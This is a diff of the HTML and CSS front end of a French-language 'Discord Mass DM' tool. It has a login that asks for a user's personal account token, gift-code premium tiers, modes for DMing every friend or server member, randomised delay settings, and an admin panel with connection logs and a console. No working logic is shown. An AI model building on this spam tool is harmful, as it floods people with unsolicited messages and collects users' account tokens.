+        /* DM Modes */
         .dm-modes {
             display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 20px;
-            margin-bottom: 30px;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
         }
 
         .dm-card {
             background: var(--bg-secondary);
-            padding: 25px;
-            border-radius: 30px;
+            border: 2px solid transparent;
+            border-radius: 50px;
+            padding: 35px 25px;
             text-align: center;
             cursor: pointer;
-            border: 2px solid transparent;
-            transition: all 0.3s;
+            transition: all var(--transition-base);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .dm-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle at 50% 50%, rgba(88, 101, 242, 0.15), transparent);
+            opacity: 0;
+            transition: opacity var(--transition-base);
+        }
+
+        .dm-card:hover {
+            transform: translateY(-6px);
+            border-color: var(--primary-600);
+            box-shadow: var(--shadow-2xl);
+        }
+
+        .dm-card:hover::before {
+            opacity: 1;
         }
 
         .dm-card.selected {
-            border-color: var(--accent);
+            border-color: var(--primary-600);
             background: rgba(88, 101, 242, 0.1);
-        }
-
-        .dm-card.premium {
-            background: linear-gradient(135deg, var(--bg-secondary), rgba(255, 115, 250, 0.1));
+            box-shadow: var(--shadow-glow);
         }
 
         .dm-icon {
-            font-size: 48px;
-            margin-bottom: 15px;
+            font-size: 56px;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
         }
 
         .dm-title {
-            font-weight: 700;
-            font-size: 16px;
-            margin-bottom: 8px;
+            font-weight: 800;
+            font-size: 1.3rem;
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
         }
 
         .dm-desc {
             color: var(--text-secondary);
-            font-size: 12px;
+            font-size: 0.9rem;
+            position: relative;
+            z-index: 1;
         }
 
-        /* ==================== PANEL ADMIN ==================== */
+        /* Premium Tag */
+        .premium-tag {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: linear-gradient(135deg, var(--premium-500), var(--premium-600));
+            color: white;
+            padding: 6px 15px;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            z-index: 2;
+            animation: pulse 2s infinite;
+        }
+
+        /* Config Panel */
+        .config-panel {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-medium);
+            border-radius: 60px;
+            padding: clamp(30px, 5vw, 45px);
+            margin: 40px 0;
+        }
+
+        .config-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+        }
+
+        @media (max-width: 768px) {
+            .config-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* Progress */
+        .progress-container {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-medium);
+            border-radius: 60px;
+            padding: 35px;
+            margin-top: 40px;
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+            font-weight: 700;
+            font-size: 1.2rem;
+        }
+
+        .progress-stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid var(--border-medium);
+            font-size: 1.1rem;
+        }
+
+        /* Admin Panel */
         .admin-panel {
-            margin-top: 50px;
-            padding: 40px;
-            background: linear-gradient(135deg, rgba(237, 66, 69, 0.15), rgba(88, 101, 242, 0.15));
-            border-radius: 50px;
-            border: 3px solid var(--danger);
+            margin-top: 60px;
+            padding: clamp(30px, 5vw, 50px);
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.15), rgba(88, 101, 242, 0.15));
+            border: 3px solid var(--error-500);
+            border-radius: 70px;
+            animation: borderGlow 3s ease-in-out infinite;
         }
 
         .admin-header {
             display: flex;
+            flex-wrap: wrap;
+            gap: 25px;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
         }
 
         .admin-title {
-            font-size: 32px;
+            font-size: clamp(28px, 5vw, 38px);
             font-weight: 800;
-            color: var(--danger);
+            background: linear-gradient(135deg, var(--error-500), var(--primary-600));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        /* ==================== BOT CONFIG ==================== */
+        /* Bot Config */
         .bot-config {
             background: var(--bg-secondary);
-            padding: 30px;
-            border-radius: 35px;
-            margin-bottom: 30px;
+            border: 1px solid var(--border-medium);
+            border-radius: 50px;
+            padding: 35px;
+            margin-bottom: 40px;
         }
 
         .bot-status {
             display: flex;
             align-items: center;
             gap: 15px;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
+            padding: 20px;
+            background: var(--bg-tertiary);
+            border-radius: 40px;
         }
 
         .status-dot {
-            width: 15px;
-            height: 15px;
+            width: 20px;
+            height: 20px;
             border-radius: 50%;
+            animation: pulse 2s infinite;
         }
 
-        .status-dot.online { background: var(--success); animation: pulse 2s infinite; }
-        .status-dot.offline { background: var(--danger); }
+        .status-dot.online {
+            background: var(--success-500);
+            box-shadow: 0 0 25px var(--success-500);
+        }
 
-        /* ==================== CODE GENERATOR ==================== */
+        .status-dot.offline {
+            background: var(--error-500);
+            box-shadow: 0 0 25px var(--error-500);
+        }
+
+        /* Code Generator */
         .code-generator {
             background: var(--bg-secondary);
-            padding: 30px;
-            border-radius: 35px;
-            margin-bottom: 30px;
+            border: 1px solid var(--border-medium);
+            border-radius: 50px;
+            padding: 35px;
+            margin-bottom: 40px;
         }
 
         .code-grid {
             display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-            margin-top: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin-top: 25px;
         }
 
         .code-item {
             background: var(--bg-tertiary);
-            padding: 20px;
-            border-radius: 25px;
+            border: 2px solid var(--premium-500);
+            border-radius: 40px;
+            padding: 25px;
             text-align: center;
-            border: 2px solid var(--premium);
+            transition: all var(--transition-base);
+            animation: fadeInUp 0.5s;
+        }
+
+        .code-item:hover {
+            transform: translateY(-6px) scale(1.02);
+            box-shadow: var(--shadow-glow-premium);
         }
 
         .code-value {
-            font-size: 18px;
-            font-weight: 700;
-            color: var(--premium);
-            margin-bottom: 10px;
-            letter-spacing: 2px;
+            font-size: 1.5rem;
+            font-weight: 800;
+            color: var(--premium-500);
+            margin-bottom: 15px;
+            letter-spacing: 3px;
+            font-family: 'JetBrains Mono', monospace;
         }
 
         .code-info {
-            font-size: 12px;
             color: var(--text-secondary);
+            font-size: 0.95rem;
             margin-bottom: 15px;
         }
 
         .code-uses {
-            color: var(--success);
+            color: var(--success-500);
             font-weight: 700;
+            font-size: 1.1rem;
         }
 
-        /* ==================== CONSOLE ==================== */
-        .admin-console {
-            background: #0a0c15;
-            border-radius: 30px;
-            padding: 25px;
-            margin-top: 30px;
-        }
-
-        .console-output {
-            height: 200px;
-            overflow-y: auto;
-            color: #0f0;
-            font-size: 13px;
-            margin-bottom: 20px;
-            padding: 20px;
-            background: #000;
-            border-radius: 20px;
-            font-family: monospace;
-        }
-
-        .console-input {
-            display: flex;
-            gap: 15px;
-        }
-
-        .console-input input {
-            flex: 1;
-            padding: 15px;
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 20px;
-            color: #0f0;
-            font-family: monospace;
-        }
-
-        .console-input button {
-            padding: 15px 30px;
-            background: var(--success);
-            color: black;
-            border: none;
-            border-radius: 20px;
-            font-weight: 700;
-            cursor: pointer;
-        }
-
-        /* ==================== LOGS ==================== */
+        /* Connection Logs */
         .connection-logs {
             background: var(--bg-secondary);
-            border-radius: 35px;
-            padding: 25px;
-            margin-bottom: 30px;
+            border: 1px solid var(--border-medium);
+            border-radius: 50px;
+            padding: 35px;
+            margin-bottom: 40px;
+            overflow-x: auto;
         }
 
         .logs-table {
             width: 100%;
             border-collapse: collapse;
+            min-width: 700px;
         }
 
-        .logs-table th,
-        .logs-table td {
-            padding: 15px;
+        .logs-table th {
             text-align: left;
-            border-bottom: 1px solid var(--border);
+            padding: 18px;
+            color: var(--text-secondary);
+            font-weight: 700;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-bottom: 2px solid var(--border-medium);
         }
 
-        .status-online { color: var(--success); }
-        .status-offline { color: var(--danger); }
+        .logs-table td {
+            padding: 16px 18px;
+            border-bottom: 1px solid var(--border-medium);
+        }
+
+        .logs-table tr {
+            transition: background var(--transition-fast);
+        }
+
+        .logs-table tr:hover {
+            background: var(--bg-tertiary);
+        }
+
+        .status-online {
+            color: var(--success-500);
+            font-weight: 700;
+        }
+
+        .status-offline {
+            color: var(--error-500);
+            font-weight: 700;
+        }
+
+        /* Console */
+        .admin-console {
+            background: #0a0c15;
+            border: 2px solid var(--border-medium);
+            border-radius: 50px;
+            padding: 30px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .console-output {
+            height: 300px;
+            overflow-y: auto;
+            color: #00ff00;
+            font-size: 0.9rem;
+            line-height: 1.8;
+            margin-bottom: 25px;
+            padding: 25px;
+            background: #000000;
+            border-radius: 30px;
+            border: 1px solid #333;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        .console-output::-webkit-scrollbar {
+            width: 10px;
+        }
+
+        .console-output::-webkit-scrollbar-track {
+            background: #1a1a1a;
+            border-radius: 10px;
+        }
+
+        .console-output::-webkit-scrollbar-thumb {
+            background: var(--primary-600);
+            border-radius: 10px;
+        }
+
+        .console-line {
+            margin-bottom: 8px;
+            border-bottom: 1px solid #1a1a1a;
+            padding-bottom: 5px;
+        }
+
+        .console-time {
+            color: #666;
+            margin-right: 20px;
+            font-size: 0.85rem;
+        }
+
+        .console-command {
+            color: #00ff00;
+            font-weight: 700;
+        }
+
+        .console-error {
+            color: #ff4444;
+        }
+
+        .console-success {
+            color: #44ff44;
+        }
+
+        .console-warning {
+            color: #ffff44;
+        }
+
+        .console-info {
+            color: #4444ff;
+        }
+
+        .console-input-group {
+            display: flex;
+            gap: 15px;
+        }
+
+        .console-input-group input {
+            flex: 1;
+            padding: 18px 25px;
+            background: #1a1a1a;
+            border: 2px solid #333;
+            border-radius: 40px;
+            color: #00ff00;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 1rem;
+            transition: all var(--transition-fast);
+        }
+
+        .console-input-group input:focus {
+            outline: none;
+            border-color: var(--success-500);
+            box-shadow: 0 0 30px rgba(34, 197, 94, 0.3);
+        }
+
+        .console-input-group button {
+            padding: 18px 40px;
+            background: linear-gradient(135deg, var(--success-500), var(--success-600));
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all var(--transition-base);
+            white-space: nowrap;
+        }
+
+        .console-input-group button:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 15px 40px rgba(34, 197, 94, 0.4);
+        }
+
+        /* Logs */
+        .logs-container {
+            margin-top: 40px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-medium);
+            border-radius: 50px;
+            padding: 30px;
+        }
+
+        .logs-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--border-medium);
+        }
+
+        .logs-content {
+            max-height: 250px;
+            overflow-y: auto;
+            font-size: 0.95rem;
+        }
+
+        .log-entry {
+            padding: 12px;
+            border-bottom: 1px solid var(--border-medium);
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            transition: background var(--transition-fast);
+        }
+
+        .log-entry:hover {
+            background: var(--bg-tertiary);
+        }
+
+        .log-time {
+            color: var(--primary-600);
+            font-weight: 700;
+            min-width: 80px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .log-type {
+            min-width: 90px;
+            font-weight: 700;
+            text-transform: uppercase;
+            font-size: 0.8rem;
+        }
+
+        .log-type.info {
+            color: var(--info-500);
+        }
+
+        .log-type.success {
+            color: var(--success-500);
+        }
+
+        .log-type.error {
+            color: var(--error-500);
+        }
+
+        .log-type.warning {
+            color: var(--warning-500);
+        }
+
+        .log-type.premium {
+            color: var(--premium-500);
+        }
+
+        .log-message {
+            flex: 1;
+            color: var(--text-secondary);
+        }
+
+        /* Toast Notifications */
+        .toast {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            background: var(--bg-card);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border-medium);
+            border-radius: 40px;
+            padding: 25px 30px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            z-index: var(--z-toast);
+            animation: slideInUp 0.3s, fadeOut 0.3s 4.7s forwards;
+            box-shadow: var(--shadow-2xl);
+            max-width: 450px;
+        }
+
+        .toast-icon {
+            font-size: 28px;
+        }
+
+        .toast-content {
+            flex: 1;
+        }
+
+        .toast-title {
+            font-weight: 800;
+            margin-bottom: 5px;
+            font-size: 1.1rem;
+        }
+
+        .toast-message {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+
+        .toast-close {
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 24px;
+            padding: 5px;
+            transition: color var(--transition-fast);
+        }
+
+        .toast-close:hover {
+            color: var(--text-primary);
+        }
+
+        .toast.success .toast-icon {
+            color: var(--success-500);
+        }
+
+        .toast.error .toast-icon {
+            color: var(--error-500);
+        }
+
+        .toast.warning .toast-icon {
+            color: var(--warning-500);
+        }
+
+        .toast.info .toast-icon {
+            color: var(--info-500);
+        }
+
+        .toast.premium .toast-icon {
+            color: var(--premium-500);
+        }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(15px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: var(--z-modal);
+            animation: fadeIn 0.3s;
+        }
+
+        .modal {
+            background: var(--bg-card);
+            border: 1px solid var(--border-medium);
+            border-radius: 70px;
+            padding: 50px;
+            max-width: 600px;
+            width: 90%;
+            max-height: 90vh;
+            overflow-y: auto;
+            animation: scaleIn 0.5s var(--transition-bounce);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+            padding-bottom: 25px;
+            border-bottom: 2px solid var(--border-medium);
+        }
+
+        .modal-title {
+            font-size: 1.8rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #fff, var(--primary-600));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .modal-close {
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 28px;
+            cursor: pointer;
+            padding: 5px;
+            transition: color var(--transition-fast);
+        }
+
+        .modal-close:hover {
+            color: var(--text-primary);
+            transform: rotate(90deg);
+        }
+
+        .modal-body {
+            margin-bottom: 30px;
+        }
+
+        .modal-footer {
+            display: flex;
+            justify-content: flex-end;
+            gap: 20px;
+        }
+
+        /* Utilities */
+        .hidden {
+            display: none !important;
+        }
+
+        .visible {
+            display: block !important;
+        }
+
+        .invisible {
+            visibility: hidden !important;
+        }
+
+        .sr-only {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border-width: 0;
+        }
+
+        .pointer-events-none {
+            pointer-events: none;
+        }
+
+        .pointer-events-auto {
+            pointer-events: auto;
+        }
+
+        .cursor-pointer {
+            cursor: pointer;
+        }
+
+        .cursor-default {
+            cursor: default;
+        }
+
+        .cursor-wait {
+            cursor: wait;
+        }
+
+        .cursor-not-allowed {
+            cursor: not-allowed;
+        }
+
+        .select-none {
+            user-select: none;
+        }
+
+        .select-text {
+            user-select: text;
+        }
+
+        .opacity-0 {
+            opacity: 0;
+        }
+
+        .opacity-25 {
+            opacity: 0.25;
+        }
+
+        .opacity-50 {
+            opacity: 0.5;
+        }
+
+        .opacity-75 {
+            opacity: 0.75;
+        }
+
+        .opacity-100 {
+            opacity: 1;
+        }
+
+        .overflow-hidden {
+            overflow: hidden;
+        }
+
+        .overflow-auto {
+            overflow: auto;
+        }
+
+        .overflow-scroll {
+            overflow: scroll;
+        }
+
+        .overflow-visible {
+            overflow: visible;
+        }
+
+        .z-0 {
+            z-index: 0;
+        }
+
+        .z-10 {
+            z-index: 10;
+        }
+
+        .z-20 {
+            z-index: 20;
+        }
+
+        .z-30 {
+            z-index: 30;
+        }
+
+        .z-40 {
+            z-index: 40;
+        }
+
+        .z-50 {
+            z-index: 50;
+        }
+
+        .z-auto {
+            z-index: auto;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 1536px) {
+            :root {
+                font-size: 15px;
+            }
+        }
+
+        @media (max-width: 1280px) {
+            :root {
+                font-size: 14px;
+            }
+            
+            .dashboard {
+                padding: 35px;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        @media (max-width: 1024px) {
+            :root {
+                font-size: 13px;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            :root {
+                font-size: 12px;
+            }
+            
+            .dashboard-header {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            
+            .header-actions {
+                width: 100%;
+            }
+            
+            .btn {
+                flex: 1;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .dm-modes {
+                grid-template-columns: 1fr;
+            }
+            
+            .login-card {
+                padding: 40px 25px;
+            }
+            
+            .code-input-group {
+                flex-direction: column;
+            }
+            
+            .code-input-group button {
+                width: 100%;
+            }
+            
+            .console-input-group {
+                flex-direction: column;
+            }
+            
+            .console-input-group button {
+                width: 100%;
+            }
+            
+            .toast {
+                left: 20px;
+                right: 20px;
+                max-width: none;
+            }
+        }
+
+        @media (max-width: 480px) {
+            :root {
+                font-size: 11px;
+            }
+            
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .user-profile {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .user-avatar {
+                width: 120px;
+                height: 120px;
+            }
+            
+            .modal {
+                padding: 35px 25px;
+            }
+            
+            .modal-footer {
+                flex-direction: column;
+            }
+            
+            .modal-footer .btn {
+                width: 100%;
+            }
+            
+            .logs-table {
+                font-size: 0.85rem;
+            }
+            
+            .logs-table th,
+            .logs-table td {
+                padding: 12px;
+            }
+        }
+
+        /* Print Styles */
+        @media print {
+            .no-print {
+                display: none !important;
+            }
+            
+            body {
+                background: white;
+                color: black;
+            }
+            
+            .card {
+                box-shadow: none;
+                border: 1px solid #ccc;
+            }
+        }
+
+        /* Dark Mode Support */
+        @media (prefers-color-scheme: dark) {
+            :root {
+                color-scheme: dark;
+            }
+        }
+
+        /* High Contrast Mode */
+        @media (prefers-contrast: high) {
+            :root {
+                --border-medium: rgba(255, 255, 255, 0.5);
+            }
+        }
+
+        /* Reduced Motion */
+        @media (prefers-reduced-motion: reduce) {
+            *,
+            *::before,
+            *::after {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+                scroll-behavior: auto !important;
+            }
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 12px;
+            height: 12px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-secondary);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary-600);
+            border-radius: 10px;
+            border: 3px solid var(--bg-secondary);
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-500);
+        }
+
+        ::-webkit-scrollbar-corner {
+            background: transparent;
+        }
+
+        /* Selection Styles */
+        ::selection {
+            background: var(--primary-600);
+            color: white;
+        }
+
+        /* Focus Styles */
+        :focus-visible {
+            outline: 2px solid var(--primary-600);
+            outline-offset: 2px;
+        }
     </style>
 </head>
 <body>
@@ -496,34 +3077,37 @@
         <div id="login-screen" class="login-screen">
             <div class="login-card">
                 <div class="login-header">
-                    <h1>Discord Mass DM</h1>
-                    <p style="color: var(--text-secondary);">Système de codes cadeaux</p>
+                    <div class="login-logo animate-float">
+                        <span>🎯</span>
+                    </div>
+                    <h1 class="login-title">Discord Mass DM</h1>
+                    <p class="login-subtitle">La solution ultime avec Supabase</p>
                 </div>
 
-                <!-- SECTION CODE CADEAU -->
-                <div class="code-section">
+                <!-- CODE CADEAU SECTION -->
+                <div class="code-section animate-pulse-glow">
                     <div class="code-title">
                         <span>🎁</span>
                         <span>VOUS AVEZ UN CODE CADEAU ?</span>
                         <span>🎁</span>
                     </div>
-                    <div class="code-input">
-                        <input type="text" id="giftCode" placeholder="Entrez votre code ici" maxlength="12">
+                    <div class="code-input-group">
+                        <input type="text" id="giftCode" placeholder="CODE-XXXX" maxlength="9" autocomplete="off">
                         <button onclick="redeemCode()">VALIDER</button>
                     </div>
                 </div>
 
                 <div class="input-group">
-                    <label>🔐 Token Discord</label>
-                    <input type="password" id="token" placeholder="Votre token personnel">
+                    <label class="input-label">🔐 TOKEN DISCORD</label>
+                    <input type="password" id="token" class="input-field" placeholder="Entrez votre token personnel">
                 </div>
 
-                <button class="login-btn" onclick="login()" id="loginBtn">
-                    SE CONNECTER
+                <button class="btn btn-primary btn-lg" onclick="login()" id="loginBtn" style="width: 100%;">
+                    <span>SE CONNECTER</span>
                 </button>
 
-                <div id="loginError" style="color: var(--danger); margin-top: 20px; text-align: center;"></div>
-                <div id="codeMessage" style="color: var(--success); margin-top: 10px; text-align: center;"></div>
+                <div id="loginError" class="alert alert-error" style="margin-top: 20px; display: none;"></div>
+                <div id="codeMessage" class="alert alert-success" style="margin-top: 10px; display: none;"></div>
             </div>
         </div>
 
@@ -531,165 +3115,184 @@
         <div id="main-screen" class="hidden">
             <div class="dashboard">
                 <!-- HEADER -->
-                <div class="header">
-                    <div class="user-info">
-                        <img id="avatar" class="avatar" src="https://cdn.discordapp.com/embed/avatars/0.png">
-                        <div class="user-details">
+                <div class="dashboard-header">
+                    <div class="user-profile">
+                        <div class="user-avatar">
+                            <img id="avatar" src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Avatar">
+                            <div class="user-status"></div>
+                        </div>
+                        <div class="user-info">
                             <h2 id="username">Chargement...</h2>
-                            <span id="roleBadge" class="role-badge role-user">👤 Utilisateur</span>
+                            <span id="roleBadge" class="badge badge-primary">👤 Utilisateur</span>
                         </div>
                     </div>
                     <div class="header-actions">
-                        <button id="adminPanelBtn" class="admin-btn hidden" onclick="toggleAdminPanel()">
-                            👑 PANEL ADMIN
+                        <button id="adminPanelBtn" class="btn btn-error hidden" onclick="toggleAdminPanel()">
+                            <span>👑</span>
+                            <span>PANEL ADMIN</span>
                         </button>
-                        <button class="logout-btn" onclick="logout()">
-                            🚪 DÉCONNEXION
+                        <button class="btn btn-outline" onclick="logout()">
+                            <span>🚪</span>
+                            <span>DÉCONNEXION</span>
                         </button>
                     </div>
                 </div>
 
-                <!-- STATS -->
+                <!-- STATS CARDS -->
                 <div class="stats-grid">
-                    <div class="stat-card">
-                        <div>👥</div>
+                    <div class="stat-card animate-fade-up" style="animation-delay: 0.1s;">
+                        <div class="stat-icon">👥</div>
                         <div class="stat-value" id="friendsCount">0</div>
                         <div class="stat-label">Amis</div>
                     </div>
-                    <div class="stat-card">
-                        <div>🏰</div>
+                    <div class="stat-card animate-fade-up" style="animation-delay: 0.2s;">
+                        <div class="stat-icon">🏰</div>
                         <div class="stat-value" id="guildsCount">0</div>
                         <div class="stat-label">Serveurs</div>
                     </div>
-                    <div class="stat-card">
-                        <div>✅</div>
+                    <div class="stat-card animate-fade-up" style="animation-delay: 0.3s;">
+                        <div class="stat-icon">✅</div>
                         <div class="stat-value" id="sentCount">0</div>
                         <div class="stat-label">Envoyés</div>
                     </div>
-                    <div class="stat-card">
-                        <div>❌</div>
+                    <div class="stat-card animate-fade-up" style="animation-delay: 0.4s;">
+                        <div class="stat-icon">❌</div>
                         <div class="stat-value" id="failedCount">0</div>
                         <div class="stat-label">Échecs</div>
                     </div>
-                    <div class="stat-card">
-                        <div>🤖</div>
+                    <div class="stat-card animate-fade-up" style="animation-delay: 0.5s;">
+                        <div class="stat-icon">🤖</div>
                         <div class="stat-value" id="botStatus">Off</div>
                         <div class="stat-label">Bot</div>
                     </div>
                 </div>
 
-                <!-- 4 MODES DM (TOUS DISPONIBLES MAIS CERTAINS NÉCESSITENT PREMIUM) -->
+                <!-- 4 MODES DM -->
                 <div class="dm-modes">
-                    <div class="dm-card selected" onclick="selectDMMode(1)" id="dmMode1">
+                    <div class="dm-card selected animate-scale" onclick="selectDMMode(1)" id="dmMode1" style="animation-delay: 0.1s;">
                         <div class="dm-icon">👥</div>
                         <div class="dm-title">DM All Amis</div>
                         <div class="dm-desc">Gratuit - Tous les utilisateurs</div>
                     </div>
-                    <div class="dm-card" onclick="selectDMMode(2)" id="dmMode2">
+                    <div class="dm-card animate-scale" onclick="selectDMMode(2)" id="dmMode2" style="animation-delay: 0.2s;">
                         <div class="dm-icon">🏰</div>
                         <div class="dm-title">DM All Serveur</div>
-                        <div class="dm-desc" id="mode2Desc">Nécessite premium</div>
+                        <div class="dm-desc" id="mode2Desc">Gratuit - Avec ou sans bot</div>
                     </div>
-                    <div class="dm-card" onclick="selectDMMode(3)" id="dmMode3">
+                    <div class="dm-card animate-scale" onclick="selectDMMode(3)" id="dmMode3" style="animation-delay: 0.3s;">
                         <div class="dm-icon">🤖</div>
                         <div class="dm-title">DM All Amis (Bot)</div>
-                        <div class="dm-desc" id="mode3Desc">Nécessite bot + premium</div>
+                        <div class="dm-desc" id="mode3Desc">Nécessite bot connecté</div>
                     </div>
-                    <div class="dm-card" onclick="selectDMMode(4)" id="dmMode4">
+                    <div class="dm-card animate-scale" onclick="selectDMMode(4)" id="dmMode4" style="animation-delay: 0.4s;">
                         <div class="dm-icon">🤖🏰</div>
                         <div class="dm-title">DM All Serveur (Bot)</div>
-                        <div class="dm-desc" id="mode4Desc">Nécessite bot + premium</div>
+                        <div class="dm-desc" id="mode4Desc">Gratuit avec bot connecté</div>
                     </div>
                 </div>
 
-                <!-- CONFIGURATION -->
+                <!-- CONFIGURATION PANEL -->
                 <div class="config-panel">
                     <div class="config-grid">
                         <div>
+                            <!-- Guild Selector (pour modes 2 et 4) -->
                             <div id="guildSelector" class="input-group hidden">
-                                <label>🏰 SÉLECTIONNER UN SERVEUR</label>
-                                <select id="guildSelect"></select>
+                                <label class="input-label">🏰 SÉLECTIONNER UN SERVEUR</label>
+                                <select id="guildSelect" class="input-field">
+                                    <option value="">Chargement des serveurs...</option>
+                                </select>
                             </div>
 
+                            <!-- Bot Token Input (pour modes 3 et 4) -->
                             <div id="botTokenSelector" class="input-group hidden">
-                                <label>🤖 TOKEN DU BOT</label>
-                                <input type="password" id="botToken" placeholder="Token du bot pour ce DM">
+                                <label class="input-label">🤖 TOKEN DU BOT</label>
+                                <input type="password" id="botToken" class="input-field" placeholder="Token du bot pour ce DM">
+                                <small class="text-secondary" style="display: block; margin-top: 5px;">Le bot doit avoir les intents activés</small>
                             </div>
 
                             <div class="input-group">
-                                <label>💬 MESSAGE</label>
-                                <textarea id="message" placeholder="Utilisez {user} pour mentionner">{user} Salut !</textarea>
+                                <label class="input-label">💬 MESSAGE À ENVOYER</label>
+                                <textarea id="message" class="input-field" placeholder="Utilisez {user} pour mentionner">{user} Salut !</textarea>
                             </div>
                         </div>
 
                         <div>
                             <div class="input-group">
-                                <label>⚡ VITESSE</label>
-                                <select id="speedMode">
-                                    <option value="slow">🐢 Safe (3-5s)</option>
-                                    <option value="normal" selected>⚡ Normal (2-4s)</option>
-                                    <option value="fast">🚀 Rapide (1-3s)</option>
-                                    <option value="extreme">💥 Extreme (0.5-2s)</option>
+                                <label class="input-label">⚡ MODE DE VITESSE</label>
+                                <select id="speedMode" class="input-field">
+                                    <option value="slow">🐢 Safe (3-5s aléatoire)</option>
+                                    <option value="normal" selected>⚡ Normal (2-4s aléatoire)</option>
+                                    <option value="fast">🚀 Rapide (1-3s aléatoire)</option>
+                                    <option value="extreme">💥 Extreme (0.5-2s aléatoire)</option>
                                 </select>
                             </div>
 
-                            <button class="btn btn-primary" onclick="startDM()" id="startBtn" disabled>
-                                🚀 LANCER LE DM
+                            <button class="btn btn-primary btn-lg" onclick="startDM()" id="startBtn" disabled style="width: 100%; margin-top: 20px;">
+                                <span>🚀</span>
+                                <span>LANCER LE DM</span>
                             </button>
                         </div>
                     </div>
                 </div>
 
-                <!-- PROGRESS -->
+                <!-- PROGRESS CONTAINER -->
                 <div id="progressContainer" class="progress-container hidden">
-                    <div class="progress-bar">
-                        <div id="progressFill" class="progress-fill" style="width: 0%"></div>
+                    <div class="progress-header">
+                        <span class="font-bold">PROGRESSION</span>
+                        <span id="progressPercent">0%</span>
                     </div>
-                    <div style="display: flex; justify-content: space-between;">
+                    <div class="progress">
+                        <div id="progressFill" class="progress-bar" style="width: 0%"></div>
+                    </div>
+                    <div class="progress-stats">
                         <span id="progressCurrent">0/0</span>
-                        <span id="progressSuccess">✅ 0</span>
-                        <span id="progressFailed">❌ 0</span>
+                        <span id="progressSuccess" class="text-success">✅ 0</span>
+                        <span id="progressFailed" class="text-error">❌ 0</span>
                     </div>
-                    <div id="lastUser" style="color: var(--text-secondary); margin-top: 10px;"></div>
-                    <button class="btn btn-danger" onclick="stopDM()" id="stopBtn">⏹️ ARRÊTER</button>
+                    <div id="lastUser" class="text-secondary text-center mt-4"></div>
+                    <button class="btn btn-error btn-lg" onclick="stopDM()" id="stopBtn" style="width: 100%; margin-top: 20px;">
+                        ⏹️ ARRÊTER
+                    </button>
                 </div>
 
